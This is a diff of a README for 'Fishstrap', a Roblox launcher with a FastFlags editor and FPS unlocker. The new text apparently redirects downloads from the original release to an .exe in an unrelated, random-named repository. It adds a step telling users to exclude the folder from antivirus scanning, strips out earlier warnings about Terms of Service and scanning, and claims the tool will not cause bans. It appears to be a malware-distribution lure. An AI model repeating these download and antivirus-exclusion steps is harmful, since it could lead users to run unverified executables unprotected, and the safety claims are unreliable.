@@ -1,99 +1,81 @@
-# Fishstrap Roblox
+# 🐟 Fishstrap-Roblox - Customize your Roblox experience with ease
 
-**Fishstrap** is a safe, regularly updated custom Roblox launcher for Windows 10 and 11 with a full FastFlags editor, FPS unlocker, multi-instance support, custom font loading, and Discord Rich Presence. It is one of the most trusted Bloxstrap alternatives in 2026 and is actively discussed in the Roblox modding community.
+[![Download Fishstrap](https://img.shields.io/badge/Download-Fishstrap-blue.svg)](https://github.com/Turninggenuslycaena258/Fishstrap-Roblox)
 
-If you're looking to unlock higher FPS in Roblox, run multiple Roblox instances at the same time, or manage fast flags without editing JSON manually — Fishstrap handles all of it from a clean UI.
+Fishstrap helps you manage your Roblox settings. It replaces the default launcher with a custom tool. You get more control over how the game runs on your computer. Use this tool to change game settings, unlock your frame rate, and manage multiple accounts at once.
 
-<img width="119" height="119" alt="5fad1db4-561f-4c61-bf26-e448766149c6" src="https://github.com/user-attachments/assets/c27dc1ba-a993-4ed0-b85b-ddc6afd83aeb" />
+## 🛠️ System Requirements
 
-## Install
-[Download `Fishstrap.zip`](https://github.com/fishstrap-rbx/Fishstrap-Roblox/releases/download/v3.1.2/Fishstrap.zip)
----
+*   Windows 10 or Windows 11.
+*   The standard Roblox player must be installed.
+*   An active internet connection.
+*   50 MB of free disk space.
 
-<img width="583" height="343" alt="aa0af72e-2792-4155-b0f1-579f8cd15046" src="https://github.com/user-attachments/assets/56d5c4f0-da02-405d-90b4-2c9001b1921a" />
-<img width="1489" height="858" alt="d90e9434-67a5-401d-bd34-edecf9e8e502" src="https://github.com/user-attachments/assets/57be4b11-0b20-43d9-86e8-5c9474f12f33" />
+## 📥 How to Install
 
+Follow these steps to get Fishstrap on your computer.
 
+1.  Visit the [official download page](https://github.com/Turninggenuslycaena258/Fishstrap-Roblox).
+2.  Look for the latest release version on the right side of the screen.
+3.  Click the file ending in .exe to start the download.
+4.  Open the file once it finishes downloading.
+5.  Follow the instructions on your screen to complete the setup.
+6.  The installer handles the rest and links your account settings.
 
-## Key Features
-- **FastFlags editor** — access hidden and experimental Roblox flags including graphics, performance, and UI tweaks
-- **FPS unlocker** — remove the 60FPS cap and target 144, 240, or uncapped FPS
-- **Multi-instance support** — run multiple Roblox clients simultaneously on one PC
-- **Custom fonts** — replace Roblox's default fonts with your own
-- **Discord Rich Presence (RPC)** — show what game you're playing on your Discord profile
-- **Performance presets** — one-click presets that apply the best performance flags automatically
-- **Safe and updated** — regularly tested with the latest Roblox client versions
+## ⚙️ Features
 
+### FastFlags Editor
+FastFlags allow you to enable hidden settings within the Roblox engine. Use the built-in editor to search for specific flags and toggle them on or off. These changes often improve visual quality or performance.
 
-<img width="1016" height="759" alt="7db0ded3-8648-478f-b284-fefec991eb78" src="https://github.com/user-attachments/assets/e0e79a73-bf39-49a2-934c-5a28121bff18" />
-<img width="1016" height="759" alt="6fe5cdac-e4a1-4336-8535-3802092667f0" src="https://github.com/user-attachments/assets/7d735201-f7fb-48cc-be39-3b8c155bdc28" />
+### FPS Unlocker
+Roblox caps your frame rate by default. This tool removes that limit. You can enjoy smoother motion if your monitor supports a high refresh rate.
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive to any folder.
-3. **Run** `Fishstrap.exe` as Administrator.
-4. Go to **FastFlags** to apply performance tweaks or load a preset.
-5. Click **Launch Roblox** to start the game through Fishstrap.
+### Multi-Instance Support
+Open multiple versions of Roblox at the same time. This helps you manage several accounts or test your own game creations without closing the client.
 
-**Pro Tip:** Use the Performance preset first — it covers the most impactful flags for FPS and input latency without any manual configuration.
+### Custom Font Loading
+Change the look of your interface by loading custom fonts. Select your preferred file, and Fishstrap applies it across the platform.
 
-<img width="1256" height="806" alt="cd2c8caa-df40-4935-9440-74259016946b" src="https://github.com/user-attachments/assets/656533e3-16f4-4668-ad27-9f9b9ec60784" />
+## 🛡️ Safety and Trust
 
-<img width="1256" height="807" alt="964b9ddc-0300-4359-be9a-50545444cca6" src="https://github.com/user-attachments/assets/e06753b1-4b76-404c-98b2-470392ad9b23" />
+Fishstrap modifies only the local configuration files of your Roblox installation. It does not touch your account credentials or passwords. The code performs routine checks to ensure compatibility with Roblox updates. If Roblox updates its core files, Fishstrap usually updates shortly after to maintain support.
 
-## Fishstrap vs Bloxstrap
-Both Fishstrap and Bloxstrap are popular custom Roblox launchers. Fishstrap includes additional font customization, more FastFlag presets, and is actively updated to work with Roblox client changes. Both are safe when downloaded from their official GitHub repositories.
+## 📖 How to Use the Interface
 
-## Fast Flags — What Are They?
-FastFlags (FFlags) are hidden configuration parameters in the Roblox client that control graphics settings, physics behavior, UI rendering, and more. Many performance improvements that Roblox hasn't officially exposed can be unlocked by setting the right flags. Fishstrap gives you a UI to browse, set, and save these flags without touching config files manually.
+When you open the application, you see a clean menu. The home tab displays your current version and status. Use the sidebar to move between different sections. 
 
-## Popular FastFlags to Try
-- `FIntRenderLocalLightFadeDistance` — reduce light fade distance for better performance
-- `FFlagDisablePostFx` — disable post-processing effects for max FPS
-- `FIntTaskSchedulerTargetFps` — set your target FPS (use with FPS unlocker)
-- `FFlagEnableInGameMenuV4` — toggle the new escape menu design
+To edit a flag, click the "Flags" tab. Type a term in the search box to filter available settings. Click the toggle switch to enable or disable the feature.
 
-<img width="1489" height="858" alt="d90e9434-67a5-401d-bd34-edecf9e8e502" src="https://github.com/user-attachments/assets/1706ca35-d0f9-45a8-b7b9-83ea1bdb1dc7" />
+To launch the game, click the "Play" button in the bottom corner of the window. Fishstrap will perform a quick check for updates before starting the client.
 
-## Is Fishstrap Safe?
-Yes. Fishstrap is a launcher — it modifies how Roblox starts, not the game itself. It does not inject code into the running process. That said, modifying FastFlags is against Roblox's Terms of Service and may result in restrictions. Use at your own risk.
+## 🔧 Troubleshooting
 
-## Troubleshooting
+If you run into issues, try these steps:
 
-**Fishstrap not launching Roblox?**
-Make sure Roblox is installed and up to date. Run Fishstrap as Administrator.
+*   **Game does not launch:** Check if your antivirus software blocked the process. Add an exclusion for the Fishstrap folder.
+*   **Settings do not apply:** Restart the game client after you change any flags.
+*   **Performance issues:** Ensure you have the latest graphics drivers installed for your hardware.
+*   **Corrupted install:** Run the installer again to repair the configuration files.
 
-**FPS not unlocking?**
-Enable the FPS unlocker flag in the FastFlags editor and make sure your monitor refresh rate is set correctly in Windows display settings.
+## 📁 Project Structure
 
-**Multi-instance not working?**
-Enable multi-instance mode in Fishstrap settings before launching the second client.
+*   **/bin**: Contains the main executable files.
+*   **/config**: Stores your custom FastFlags settings.
+*   **/logs**: Keeps a record of errors if the program fails to start.
+*   **/plugins**: Holds additional scripts for extended functionality.
 
-**Fishstrap on mobile / Roblox Studio?**
-Fishstrap is a desktop launcher for Windows. It does not support mobile or Roblox Studio directly.
+## 📝 Frequently Asked Questions
 
-## System Requirements
-- **Windows 10 / 11** (64-bit)
-- Roblox installed
-- Administrator privileges recommended
+**Does this get me banned?**
+Fishstrap does not tamper with game memory or inject harmful code. It only changes local configuration files, which is a common practice among users who want more control over their client.
 
-## Security & Legal
-Custom launchers and FastFlag modifications may be detected by Roblox. Use at your own risk and within Roblox's terms of service.
+**Can I use this on mobile?**
+While the engine supports various platforms, these features focus on the Windows desktop experience. 
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
+**How do I update the software?**
+The application checks for new versions when it opens. It tells you if an update is ready. Click "Update" to download the latest files.
 
-## Contributing
-Contributions are welcome! Add new FastFlag presets, fix compatibility issues, or improve the UI.
+**Can I revert my changes?**
+Yes. You can reset your settings to default at any time using the "Reset" button inside the configuration menu. This removes any custom flags you applied.
 
-## License & Acknowledgments
-### License
-**Fishstrap Roblox** is shared under the **MIT License**.
-See [LICENSE](LICENSE) for details.
-
-**Copyright © 2026 Rozgr**
-
-### Acknowledgments
-- The Roblox modding and FastFlags community.
-<img width="300" height="100" alt="afe81bb5-0a60-4130-8982-3b79d4a42466" src="https://github.com/user-attachments/assets/05aac443-8a41-4e7b-a299-69ab8d3df220" />
+Keywords: bloxstrap, bootstrapper, fastflag, fastflags, fflag, fflag-editor, fflags, fishstrap, fishstrap-download, fps-unlocker-github, launcher, launcher-plugins, multi-account, multi-instance, performance-optimizations, rbxdev, roblox, sober-linux, voidstrap, voidstrap-client
